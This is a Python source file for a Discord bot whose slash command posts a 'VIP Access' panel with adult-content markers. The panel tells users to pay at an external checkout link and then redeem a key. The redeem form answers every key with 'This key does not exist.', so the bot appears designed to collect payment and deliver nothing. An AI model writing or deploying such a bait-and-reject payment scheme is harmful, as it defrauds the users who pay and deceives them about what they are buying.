import os
import discord
from discord.ext import commands
from discord import app_commands
from typing import Optional

TOKEN = os.getenv("DISCORD_BOT_TOKEN")
GUILD_ID = os.getenv("GUILD_ID")
DEFAULT_URL = os.getenv("PANEL_API") or "https://checkout.megafile.one/b/cNi00c9Ypf3g9aV28q33W05"
DEFAULT_IMAGE_URL = "https://i.imgur.com/4EZX8AZ.gif"

if not TOKEN:
    raise Exception("Missing DISCORD_BOT_TOKEN environment variable")

intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)


class RedeemModal(discord.ui.Modal, title="Redeem your key"):
    key_input = discord.ui.TextInput(
        label="Paste your key",
        placeholder="e.g. AbCdE123...",
        required=True
    )

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.send_message(
            "This key does not exist.",
            ephemeral=True
        )


class RedeemButton(discord.ui.Button):
    def __init__(self):
        super().__init__(
            label="Redeem Key",
            style=discord.ButtonStyle.success
        )

    async def callback(self, interaction: discord.Interaction):
        await interaction.response.send_modal(RedeemModal())


class PanelButtons(discord.ui.View):
    def __init__(self, access_url: str):
        super().__init__(timeout=None)

        self.add_item(
            discord.ui.Button(
                label="Access VIP Content",
                style=discord.ButtonStyle.link,
                url=access_url
            )
        )

        self.add_item(RedeemButton())


def valid_url(url: str) -> bool:
    return isinstance(url, str) and (url.startswith("https://") or url.startswith("http://"))


@bot.tree.command(name="vip-panel", description="Post the VIP panel")
@app_commands.describe(
    step2_channel="Channel users should click in step 1",
    image_url="Image/GIF URL to show in the embed",
    access_url="URL for the Access VIP Content button"
)
async def vip_panel(
    interaction: discord.Interaction,
    step2_channel: app_commands.AppCommandChannel,
    image_url: Optional[str] = None,
    access_url: Optional[str] = None
):
    try:
        final_image_url = image_url or DEFAULT_IMAGE_URL
        final_access_url = access_url or DEFAULT_URL

        if not valid_url(final_access_url):
            await interaction.response.send_message(
                "The access URL must start with http:// or https://",
                ephemeral=True
            )
            return

        if final_image_url and not valid_url(final_image_url):
            await interaction.response.send_message(
                "The image URL must start with http:// or https://",
                ephemeral=True
            )
            return

        embed = discord.Embed(
            title="🔞Redeem your VIP Access key here!🔞",
            description=(
                "### Follow the simple steps below to unlock your private vault!\n\n"
                f"> Click {step2_channel.mention}.\n"
                "> Complete checkout to redeem your key.\n"
                "> Press Redeem Key and enter the key.\n"
                "> Done - enjoy your access!"
            ),
            color=0x00ff00
        )

        embed.set_image(url=final_image_url)

        await interaction.response.send_message(
            embed=embed,
            view=PanelButtons(final_access_url)
        )

    except Exception as e:
        print(f"vip_panel error: {e}")
        if not interaction.response.is_done():
            await interaction.response.send_message(
                f"Error: {e}",
                ephemeral=True
            )


@bot.event
async def on_ready():
    try:
        if GUILD_ID:
            guild = discord.Object(id=int(GUILD_ID))
            bot.tree.copy_global_to(guild=guild)
            await bot.tree.sync(guild=guild)
        else:
            await bot.tree.sync()
    except Exception as e:
        print(f"Sync error: {e}")

    print(f"Logged in as {bot.user}")


@bot.tree.error
async def on_app_command_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    print(f"App command error: {error}")
    if not interaction.response.is_done():
        await interaction.response.send_message(
            f"Command error: {error}",
            ephemeral=True
        )


bot.run(TOKEN)
